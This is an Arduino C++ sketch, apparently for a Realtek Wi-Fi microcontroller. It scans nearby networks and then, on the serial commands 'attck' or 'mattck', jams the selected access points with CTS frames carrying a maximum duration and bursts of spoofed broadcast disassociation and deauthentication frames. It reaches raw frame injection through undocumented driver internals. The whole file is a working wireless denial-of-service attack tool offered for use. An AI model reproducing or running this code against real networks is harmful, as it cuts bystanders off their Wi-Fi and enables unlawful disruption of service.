#include <Arduino.h>
#include <wifi_conf.h>
#include <wifi_util.h>
#include <wifi_structures.h>
#include <vector>
#include <set>
#include <freertos_pmu.h>
#define WLAN0_NAME "wlan0"

extern uint8_t *rltk_wlan_info;
extern "C" void *alloc_mgtxmitframe(void *ptr);
extern "C" void update_mgntframe_attrib(void *ptr, void *frame_control);
extern "C" int dump_mgntframe(void *ptr, void *frame_control);
struct ScanRes {
  String ssid;
  uint8_t bssid[6];
  int channel;
  uint16_t seq_num;};
std::vector<ScanRes> found_networks;
std::vector<int> target_indices;
std::set<int> active_channels;
bool attack_active = false;
#pragma pack(push, 1)
struct MgmtFrame {
  uint16_t frame_control;
  uint16_t duration = 0x3A01;
  uint8_t destination[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
  uint8_t source[6];
  uint8_t access_point[6];
  uint16_t sequence_number = 0;
  uint16_t reason = 0x0100;};
struct CTSFrame {
  uint16_t frame_control = 0x00C4;
  uint16_t duration = 0xFFFF;//32ms
  uint8_t receiver_addr[6];};
#pragma pack(pop)

void sendRaw(void *frame, size_t len) {
  if (!rltk_wlan_info) return;
  uint8_t *ptr = (uint8_t *)**(uint32_t **)(rltk_wlan_info + 0x10);
  void *f_ctrl = alloc_mgtxmitframe(ptr + 0xae0);
  if (f_ctrl) {
    update_mgntframe_attrib(ptr, (void *)((uint8_t *)f_ctrl + 8));
    memset((void *)*(uint32_t *)((uint8_t *)f_ctrl + 0x80), 0, 0x68);
    uint8_t *f_data = (uint8_t *)*(uint32_t *)((uint8_t *)f_ctrl + 0x80) + 0x28;
    memcpy(f_data, frame, len);
    *(uint32_t *)((uint8_t *)f_ctrl + 0x14) = len;
    *(uint32_t *)((uint8_t *)f_ctrl + 0x18) = len;
    dump_mgntframe(ptr, f_ctrl);}}

rtw_result_t scanHandler(rtw_scan_handler_result_t *res) {
  if (res->scan_complete == 0) {
    rtw_scan_result_t *ap = &res->ap_details;
    ScanRes s;
    s.ssid = String((const char *)ap->SSID.val);
    memcpy(s.bssid, ap->BSSID.octet, 6);
    s.channel = ap->channel;
    s.seq_num = random(0, 4000);
    found_networks.push_back(s);
    Serial.println("[" + String(found_networks.size() - 1) + "] " + s.ssid + " CH:" + String(s.channel));}
  return RTW_SUCCESS;}

void setup() {
  Serial.begin(115200);
  wifi_on(RTW_MODE_STA);
  wifi_enable_powersave();
  pmu_set_sysactive_time(0);}

void loop() {
  if (attack_active && !target_indices.empty()) {
    for (int ch : active_channels) {
      wext_set_channel(WLAN0_NAME, ch);
      for (int idx : target_indices) {
        if (idx < 0 || (size_t)idx >= found_networks.size()) continue;
        if (found_networks[idx].channel != ch) continue;
        ScanRes &target = found_networks[idx];
        ////
        CTSFrame cts;
        memcpy(cts.receiver_addr, target.bssid, 6);
        sendRaw(&cts, sizeof(CTSFrame));
        ////
        MgmtFrame m;
        memcpy(m.source, target.bssid, 6);
        memcpy(m.access_point, target.bssid, 6);
        ////
        for (int i = 0; i < 40; i++) {
          target.seq_num = (target.seq_num + 1) & 0x0FFF;
          m.sequence_number = target.seq_num << 4;
          if (i < 20) {
            m.frame_control = 0xA0;//disas
            m.reason = 0x0600;//dop
          } else {
            m.frame_control = 0xC0;//deauth
            m.reason = 0x0100;}
          sendRaw(&m, sizeof(MgmtFrame));}}
      delayMicroseconds(50);}}//not speed

  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    if (cmd == "scan") {
      attack_active = false;
      found_networks.clear();
      pmu_set_sysactive_time(0xFFFFFFFF);
      wifi_scan_networks(scanHandler, NULL);
      delay(5000);
      pmu_set_sysactive_time(0);
    } else if (cmd.startsWith("attck ") || cmd.startsWith("mattck ")) {//attck - attack on 1 net, mattck attack on many net
    //example attck 4, mattck 0 2 4 5 6 7 8 11
      bool is_multi = cmd.startsWith("mattck ");
      target_indices.clear();
      active_channels.clear();
      String targets = is_multi ? cmd.substring(7) : cmd.substring(6);
      size_t startIdx = 0;
      int spaceIdx = targets.indexOf(' ');
      while (startIdx < (size_t)targets.length()) {
        String sub = (spaceIdx == -1) ? targets.substring(startIdx) : targets.substring(startIdx, spaceIdx);
        int idx = sub.toInt();
        target_indices.push_back(idx);
        if (idx >= 0 && (size_t)idx < found_networks.size()) {
          active_channels.insert(found_networks[idx].channel);}
        if (spaceIdx == -1) break;
        startIdx = spaceIdx + 1;
        spaceIdx = targets.indexOf(' ', startIdx);}
      if (!target_indices.empty()) {
        wifi_disable_powersave();
        pmu_set_sysactive_time(0xFFFFFFFF);
        attack_active = true;
        Serial.println("cts block + disassoc + deauth.");}
    } else if (cmd == "stop") {
      attack_active = false;
      wifi_enable_powersave();
      pmu_set_sysactive_time(0);}}}